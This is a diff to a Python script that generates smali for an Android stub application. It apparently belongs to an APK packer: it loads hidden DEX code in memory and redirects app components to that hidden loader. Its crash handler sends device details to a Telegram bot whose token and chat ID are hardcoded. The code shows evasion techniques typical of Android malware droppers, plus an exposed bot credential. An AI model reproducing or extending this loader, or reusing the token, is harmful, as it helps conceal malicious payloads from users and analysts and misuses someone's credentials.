@@ -4309,6 +4309,8 @@ def main():
 .field private static final TG_TOKEN:Ljava/lang/String; = "9130546359:AAEl7vR4ahiQzX45RGjhUumBZRorvbyQXUw"
 .field private static final TG_CHAT:Ljava/lang/String;  = "8852912150"
 .field private static final BUILD_TAG:Ljava/lang/String; = "BUILD#{_build_num}-{_build_sha}"
+# Fix C: hold IMDCL reference so CoreComponentFactory can retry with it
+.field public static sCL:Ljava/lang/ClassLoader;
 
 .method public attachBaseContext(Landroid/content/Context;)V
     .locals 11
@@ -4354,6 +4356,9 @@ def main():
 
     new-instance v8, Ldalvik/system/InMemoryDexClassLoader;
     invoke-direct {{v8, v6, v7}}, Ldalvik/system/InMemoryDexClassLoader;-><init>(Ljava/nio/ByteBuffer;Ljava/lang/ClassLoader;)V
+
+    # Fix C: store IMDCL into static sCL so CoreComponentFactory can retry with it
+    sput-object v8, L{_new_path}/StubApp;->sCL:Ljava/lang/ClassLoader;
 
     # Walk p1 (ContextImpl) directly for mPackageInfo → LoadedApk
     # FIX: p1 IS ContextImpl — do NOT walk mBase (ContextWrapper field, not here)
@@ -4723,6 +4728,11 @@ def main():
 
                 # ── StubApp$CrashHandler.smali ─────────────────────────────────
                 # CRITICAL FIX (Build #16): return-void BEFORE :catch_handler / move-exception
+                # CRITICAL FIX (Build #2xx): blocking HTTP POST in uncaughtException so the
+                # crash log actually reaches Telegram before the OS kills the process.
+                # Fire-and-forget sendTelegram() starts a thread and returns — the process
+                # dies before the HTTP POST completes. This version does the POST inline on
+                # the dying thread + Thread.sleep(3000) to give it time to finish.
                 _crash_handler_smali = f"""\
 .class L{_new_path}/StubApp$CrashHandler;
 .super Ljava/lang/Object;
@@ -4736,18 +4746,104 @@ def main():
 .end method
 
 .method public uncaughtException(Ljava/lang/Thread;Ljava/lang/Throwable;)V
-    .locals 3
+    .locals 10
     :try_ue_start
+
+    # Build crash message: "CRASH | <throwable> | at <first stack frame>"
     invoke-virtual {{p2}}, Ljava/lang/Throwable;->toString()Ljava/lang/String;
     move-result-object v0
-    new-instance v1, Ljava/lang/StringBuilder;
-    invoke-direct {{v1}}, Ljava/lang/StringBuilder;-><init>()V
-    const-string v2, "UNCAUGHT: "
-    invoke-virtual {{v1, v2}}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
-    invoke-virtual {{v1, v0}}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
-    invoke-virtual {{v1}}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
+
+    invoke-virtual {{p2}}, Ljava/lang/Throwable;->getStackTrace()[Ljava/lang/StackTraceElement;
+    move-result-object v1
+    array-length v2, v1
+    if-lez v2, :no_frame
+    const/4 v2, 0x0
+    aget-object v1, v1, v2
+    invoke-virtual {{v1}}, Ljava/lang/StackTraceElement;->toString()Ljava/lang/String;
+    move-result-object v1
+    goto :has_frame
+    :no_frame
+    const-string v1, "unknown"
+    :has_frame
+
+    new-instance v2, Ljava/lang/StringBuilder;
+    invoke-direct {{v2}}, Ljava/lang/StringBuilder;-><init>()V
+    const-string v3, "CRASH | "
+    invoke-virtual {{v2, v3}}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+    invoke-virtual {{v2, v0}}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+    const-string v3, " | at "
+    invoke-virtual {{v2, v3}}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+    invoke-virtual {{v2, v1}}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+    const-string v3, " | Device: "
+    invoke-virtual {{v2, v3}}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+    sget-object v3, Landroid/os/Build;->MODEL:Ljava/lang/String;
+    invoke-virtual {{v2, v3}}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+    const-string v3, " API "
+    invoke-virtual {{v2, v3}}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+    sget v3, Landroid/os/Build$VERSION;->SDK_INT:I
+    invoke-virtual {{v2, v3}}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;
+    invoke-virtual {{v2}}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
     move-result-object v0
-    invoke-static {{v0}}, L{_new_path}/StubApp;->sendTelegram(Ljava/lang/String;)V
+
+    # Build Telegram URL
+    sget-object v1, L{_new_path}/StubApp;->TG_TOKEN:Ljava/lang/String;
+    new-instance v2, Ljava/lang/StringBuilder;
+    invoke-direct {{v2}}, Ljava/lang/StringBuilder;-><init>()V
+    const-string v3, "https://api.telegram.org/bot"
+    invoke-virtual {{v2, v3}}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+    invoke-virtual {{v2, v1}}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+    const-string v3, "/sendMessage"
+    invoke-virtual {{v2, v3}}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+    invoke-virtual {{v2}}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
+    move-result-object v2
+
+    # URLEncode the message
+    sget-object v3, L{_new_path}/StubApp;->TG_CHAT:Ljava/lang/String;
+    const-string v4, "UTF-8"
+    invoke-static {{v0, v4}}, Ljava/net/URLEncoder;->encode(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
+    move-result-object v5
+    new-instance v4, Ljava/lang/StringBuilder;
+    invoke-direct {{v4}}, Ljava/lang/StringBuilder;-><init>()V
+    const-string v6, "chat_id="
+    invoke-virtual {{v4, v6}}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+    invoke-virtual {{v4, v3}}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+    const-string v6, "&text="
+    invoke-virtual {{v4, v6}}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+    invoke-virtual {{v4, v5}}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+    invoke-virtual {{v4}}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
+    move-result-object v4
+
+    # Blocking HTTP POST — inline on dying thread (no new thread spawn)
+    new-instance v5, Ljava/net/URL;
+    invoke-direct {{v5, v2}}, Ljava/net/URL;-><init>(Ljava/lang/String;)V
+    invoke-virtual {{v5}}, Ljava/net/URL;->openConnection()Ljava/net/URLConnection;
+    move-result-object v5
+    check-cast v5, Ljava/net/HttpURLConnection;
+    const-string v6, "POST"
+    invoke-virtual {{v5, v6}}, Ljava/net/HttpURLConnection;->setRequestMethod(Ljava/lang/String;)V
+    const/4 v6, 0x1
+    invoke-virtual {{v5, v6}}, Ljava/net/HttpURLConnection;->setDoOutput(Z)V
+    const/16 v6, 0x2710
+    invoke-virtual {{v5, v6}}, Ljava/net/HttpURLConnection;->setConnectTimeout(I)V
+    invoke-virtual {{v5, v6}}, Ljava/net/HttpURLConnection;->setReadTimeout(I)V
+    const-string v6, "Content-Type"
+    const-string v7, "application/x-www-form-urlencoded"
+    invoke-virtual {{v5, v6, v7}}, Ljava/net/HttpURLConnection;->setRequestProperty(Ljava/lang/String;Ljava/lang/String;)V
+    invoke-virtual {{v5}}, Ljava/net/HttpURLConnection;->getOutputStream()Ljava/io/OutputStream;
+    move-result-object v6
+    const-string v7, "UTF-8"
+    invoke-virtual {{v4, v7}}, Ljava/lang/String;->getBytes(Ljava/lang/String;)[B
+    move-result-object v7
+    invoke-virtual {{v6, v7}}, Ljava/io/OutputStream;->write([B)V
+    invoke-virtual {{v6}}, Ljava/io/OutputStream;->flush()V
+    invoke-virtual {{v6}}, Ljava/io/OutputStream;->close()V
+    invoke-virtual {{v5}}, Ljava/net/HttpURLConnection;->getResponseCode()I
+    invoke-virtual {{v5}}, Ljava/net/HttpURLConnection;->disconnect()V
+
+    # Sleep 3s to let the network stack flush before process death
+    const-wide/16 v6, 0xBB8
+    invoke-static {{v6, v7}}, Ljava/lang/Thread;->sleep(J)V
+
     :try_ue_end
     .catch Ljava/lang/Throwable; {{:try_ue_start .. :try_ue_end}} :catch_ue
 
@@ -4864,44 +4960,75 @@ def main():
 """
 
                 # ── CoreComponentFactory.smali (androidx path, not new_pkg) ──
-                _core_cf_smali = """\
+                # Fix B: on ClassNotFoundException retry using StubApp.sCL (IMDCL)
+                # instead of returning null — a null Activity causes an NPE deep
+                # in ActivityThread.performLaunchActivity at getClass() call.
+                _core_cf_smali = f"""\
 .class public Landroidx/core/app/CoreComponentFactory;
 .super Landroid/app/AppComponentFactory;
 .source "CoreComponentFactory.java"
 
 .method public constructor <init>()V
     .locals 0
-    invoke-direct {p0}, Landroid/app/AppComponentFactory;-><init>()V
+    invoke-direct {{p0}}, Landroid/app/AppComponentFactory;-><init>()V
     return-void
 .end method
 
 .method public instantiateApplication(Ljava/lang/ClassLoader;Ljava/lang/String;)Landroid/app/Application;
-    .locals 2
-    :try_start
-    invoke-super {p0, p1, p2}, Landroid/app/AppComponentFactory;->instantiateApplication(Ljava/lang/ClassLoader;Ljava/lang/String;)Landroid/app/Application;
+    .locals 3
+    :try_start_app
+    invoke-super {{p0, p1, p2}}, Landroid/app/AppComponentFactory;->instantiateApplication(Ljava/lang/ClassLoader;Ljava/lang/String;)Landroid/app/Application;
     move-result-object v0
     return-object v0
-    :try_end
-    .catch Ljava/lang/ClassNotFoundException; {:try_start .. :try_end} :catch_cnf
-    :catch_cnf
+    :try_end_app
+    .catch Ljava/lang/ClassNotFoundException; {{:try_start_app .. :try_end_app}} :catch_app
+
+    :catch_app
     move-exception v0
-    invoke-virtual {v0}, Ljava/lang/ClassNotFoundException;->printStackTrace()V
-    const/4 v0, 0x0
+    # Try IMDCL stored in StubApp.sCL
+    sget-object v1, L{_new_path}/StubApp;->sCL:Ljava/lang/ClassLoader;
+    if-eqz v1, :app_fallback
+    :try_imdcl_app_start
+    invoke-virtual {{v1, p2}}, Ljava/lang/ClassLoader;->loadClass(Ljava/lang/String;)Ljava/lang/Class;
+    move-result-object v2
+    invoke-virtual {{v2}}, Ljava/lang/Class;->newInstance()Ljava/lang/Object;
+    move-result-object v0
+    check-cast v0, Landroid/app/Application;
+    return-object v0
+    :try_imdcl_app_end
+    .catch Ljava/lang/Throwable; {{:try_imdcl_app_start .. :try_imdcl_app_end}} :app_fallback
+    :app_fallback
+    invoke-super {{p0, p1, p2}}, Landroid/app/AppComponentFactory;->instantiateApplication(Ljava/lang/ClassLoader;Ljava/lang/String;)Landroid/app/Application;
+    move-result-object v0
     return-object v0
 .end method
 
 .method public instantiateActivity(Ljava/lang/ClassLoader;Ljava/lang/String;Landroid/content/Intent;)Landroid/app/Activity;
-    .locals 2
-    :try_start
-    invoke-super {p0, p1, p2, p3}, Landroid/app/AppComponentFactory;->instantiateActivity(Ljava/lang/ClassLoader;Ljava/lang/String;Landroid/content/Intent;)Landroid/app/Activity;
+    .locals 3
+    :try_start_act
+    invoke-super {{p0, p1, p2, p3}}, Landroid/app/AppComponentFactory;->instantiateActivity(Ljava/lang/ClassLoader;Ljava/lang/String;Landroid/content/Intent;)Landroid/app/Activity;
     move-result-object v0
     return-object v0
-    :try_end
-    .catch Ljava/lang/ClassNotFoundException; {:try_start .. :try_end} :catch_cnf
-    :catch_cnf
+    :try_end_act
+    .catch Ljava/lang/ClassNotFoundException; {{:try_start_act .. :try_end_act}} :catch_act
+
+    :catch_act
     move-exception v0
-    invoke-virtual {v0}, Ljava/lang/ClassNotFoundException;->printStackTrace()V
-    const/4 v0, 0x0
+    # Try IMDCL stored in StubApp.sCL (Fix B — prevents NPE on null Activity)
+    sget-object v1, L{_new_path}/StubApp;->sCL:Ljava/lang/ClassLoader;
+    if-eqz v1, :act_fallback
+    :try_imdcl_act_start
+    invoke-virtual {{v1, p2}}, Ljava/lang/ClassLoader;->loadClass(Ljava/lang/String;)Ljava/lang/Class;
+    move-result-object v2
+    invoke-virtual {{v2}}, Ljava/lang/Class;->newInstance()Ljava/lang/Object;
+    move-result-object v0
+    check-cast v0, Landroid/app/Activity;
+    return-object v0
+    :try_imdcl_act_end
+    .catch Ljava/lang/Throwable; {{:try_imdcl_act_start .. :try_imdcl_act_end}} :act_fallback
+    :act_fallback
+    invoke-super {{p0, p1, p2, p3}}, Landroid/app/AppComponentFactory;->instantiateActivity(Ljava/lang/ClassLoader;Ljava/lang/String;Landroid/content/Intent;)Landroid/app/Activity;
+    move-result-object v0
     return-object v0
 .end method
 """
